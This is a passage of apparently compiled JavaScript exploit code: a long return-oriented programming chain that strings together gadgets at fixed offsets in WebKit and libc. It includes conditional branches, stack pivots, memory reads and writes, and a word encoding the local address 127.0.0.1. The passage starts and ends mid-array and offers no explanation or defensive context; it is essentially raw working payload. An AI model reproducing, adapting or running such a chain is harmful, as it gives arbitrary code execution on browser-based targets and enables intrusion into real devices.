libc_base+757614 //pop rcx
]);
//L2725:
db([16777343, 0]); // 0x100007f
set_gadget(libc_base+467092,); //pop rax
//L2726:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2935451, //mov [rax], ecx
libc_base+362222, //pop rsi
ropchain+172936, //L2728-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+467092 //pop rax
]);
//L2727:
db([16, 0]); // 0x10
set_gadget(libc_base+757614,); //pop rcx
//L2728:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+729289, //mov rax, r8
libc_base+362222, //pop rsi
ropchain+173032, //L2730-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222 //pop rsi
]);
//L2729:
db([4294967264, 4294967295]); // -0x20
set_gadget(libc_base+467092,); //pop rax
//L2730:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+173136, //L2733-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2731:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+757614,); //pop rcx
//L2733:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+173240, //L2736-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+173224, //L2735-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2735:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2736:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+173408, //L2739-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+173424, //L2740-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+173376, //L2737-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+173392, //L2738-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2737:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2738:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2739:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2740:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+173520, //L2742-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+173504, //L2741-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2741:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2742:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L2744:
ropchain+173640, //L2743
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+184992, //L2745
//L2743:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2746:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+757614,); //pop rcx
//L2748:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+173792, //L2751-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+173776, //L2750-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2750:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2751:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+173896, //L2754-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+173912, //L2755-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2752:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+757614,); //pop rcx
//L2754:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2755:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+7880191, //mov [rax], rcx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2756:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+757614,); //pop rcx
//L2758:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+174072, //L2761-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+174056, //L2760-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2760:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2761:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+174240, //L2764-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+174256, //L2765-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+174208, //L2762-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+174224, //L2763-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2762:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2763:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2764:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2765:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+174360, //L2768-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+174376, //L2769-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2766:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+757614,); //pop rcx
//L2768:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2769:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+362222, //pop rsi
ropchain+174440, //L2772-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2772:
db([0, 0]); // 0x0
//L2770:
set_gadgets([
libc_base+362222, //pop rsi
ropchain+174504, //L2775-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2773:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+757614,); //pop rcx
//L2775:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+174608, //L2778-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+174592, //L2777-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2777:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2778:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+174776, //L2781-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+174792, //L2782-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+174744, //L2779-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+174760, //L2780-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2779:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2780:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2781:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2782:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+174864, //L2783-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+174880, //L2784-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2783:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2784:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+174984, //L2786-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+175032, //L2789-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+175016, //L2788-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2786:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2787:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2788:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2789:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+175160, //L2790+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+175136, //L2790-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L2790:
db([0, 0]); // 0x0
set_gadgets([
ropchain+175176, //L2790+24
ropchain+180440, //L2785
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2791:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+757614,); //pop rcx
//L2793:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+175296, //L2796-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+175280, //L2795-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2795:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2796:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+175464, //L2799-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+175480, //L2800-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+175432, //L2797-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+175448, //L2798-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2797:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2798:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2799:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2800:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+175552, //L2801-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+175568, //L2802-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2801:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2802:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+175664, //L2804-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+175648, //L2803-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2803:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2804:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+175760, //L2807-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2805:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+757614,); //pop rcx
//L2807:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+175864, //L2810-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+175848, //L2809-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2809:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2810:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+176008, //L2813-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+175976, //L2811-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+175992, //L2812-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2811:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2812:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2813:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+176104, //L2816-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2814:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+757614,); //pop rcx
//L2816:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+176208, //L2819-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+176192, //L2818-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2818:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2819:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+176376, //L2822-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+176392, //L2823-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+176344, //L2820-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+176360, //L2821-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2820:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2821:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2822:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2823:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+176488, //L2825-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+176472, //L2824-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2824:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2825:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+467092, //pop rax
//L2827:
ropchain+176608, //L2826
libc_base+362222 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+766440, //pop rsp
ropchain+184160, //L2828
//L2826:
webkit_base+4342662, //mov rax, rcx
libc_base+362222 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+176680, //L2831-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2829:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+757614,); //pop rcx
//L2831:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
webkit_base+2935451, //mov [rax], ecx
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2832:
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+176824, //L2836-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+176808, //L2835-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2835:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2836:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+176992, //L2839-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+177008, //L2840-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+176960, //L2837-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+176976, //L2838-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2837:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2838:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2839:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2840:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+177080, //L2841-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+177096, //L2842-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2841:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2842:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+177192, //L2844-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+177176, //L2843-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+155394 //pop rdi
]);
//L2843:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2844:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+177272, //L2845-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2845:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2846:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2847:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+177408, //L2848-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+177440, //L2850-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+177424, //L2849-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2848:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2849:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2850:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
webkit_base+19066556, //cmp rax, rcx ; setb al
webkit_base+2766990, //setle al
libc_base+227029, //movzx eax, al
libc_base+362222, //pop rsi
ropchain+177608, //L2852-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+177624, //L2853-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+177592, //L2851-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2851:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2852:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2853:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+177728, //L2855-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+177776, //L2858-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+362222, //pop rsi
ropchain+177760, //L2857-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2855:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
//L2856:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2857:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2858:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+194572, //cmp rax, rsi ; sete al
libc_base+227029, //movzx eax, al
webkit_base+4571187, //shl rax, 3
libc_base+362222, //pop rsi
ropchain+177904, //L2859+8
libc_base+499086, //add rax, rsi
libc_base+751703, //mov rax, [rax]
libc_base+362222, //pop rsi
ropchain+177880, //L2859-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+25203959, //mov rax, r9
libc_base+766440 //pop rsp
]);
//L2859:
db([0, 0]); // 0x0
set_gadgets([
ropchain+177920, //L2859+24
ropchain+177936, //L2854
libc_base+766440, //pop rsp
ropchain+180472, //L2860
//L2854:
libc_base+362222, //pop rsi
ropchain+177976, //L2863-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2861:
db([4294967256, 4294967295]); // -0x28
set_gadget(libc_base+757614,); //pop rcx
//L2863:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+178080, //L2866-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+178064, //L2865-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2865:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2866:
db([0, 0]); // 0x0
set_gadgets([
libc_base+226017, //mov rax, [rdi]
libc_base+362222, //pop rsi
ropchain+178224, //L2869-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+178192, //L2867-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+178208, //L2868-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+757614 //pop rcx
]);
//L2867:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2868:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2869:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+362222, //pop rsi
ropchain+178296, //L2870-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2870:
db([0, 0]); // 0x0
set_gadgets([
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+178352, //L2873-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2873:
db([0, 0]); // 0x0
set_gadget(libc_base+362222,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
webkit_base+12671175, //add rdi, rsi
libc_base+424119, //mov [rdi], rax
libc_base+362222, //pop rsi
ropchain+178448, //L2876-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+729289, //mov rax, r8
libc_base+362222 //pop rsi
]);
//L2874:
db([4294967248, 4294967295]); // -0x30
set_gadget(libc_base+757614,); //pop rcx
//L2876:
db([0, 0]); // 0x0
set_gadgets([
libc_base+499086, //add rax, rsi
libc_base+362222, //pop rsi
ropchain+178552, //L2879-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+178536, //L2878-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+757614 //pop rcx
]);
//L2878:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2879:
db([0, 0]); // 0x0
set_gadgets([
libc_base+224577, //mov eax, [rdi]
libc_base+362222, //pop rsi
ropchain+178720, //L2882-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
ropchain+178736, //L2883-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4342662, //mov rax, rcx
libc_base+362222, //pop rsi
ropchain+178688, //L2880-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+382560, //mov rax, rdi
libc_base+362222, //pop rsi
ropchain+178704, //L2881-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
webkit_base+4011105 //pop r9
]);
//L2880:
db([0, 0]); // 0x0
set_gadget(libc_base+757614,); //pop rcx
//L2881:
db([0, 0]); // 0x0
set_gadget(libc_base+155394,); //pop rdi
//L2882:
db([0, 0]); // 0x0
set_gadget(libc_base+467092,); //pop rax
//L2883:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+26176694, //movsxd rax, edi
libc_base+362222, //pop rsi
ropchain+178840, //L2884-0x10
webkit_base+15977550, //mov [rsi + 0x10], rax
libc_base+362222, //pop rsi
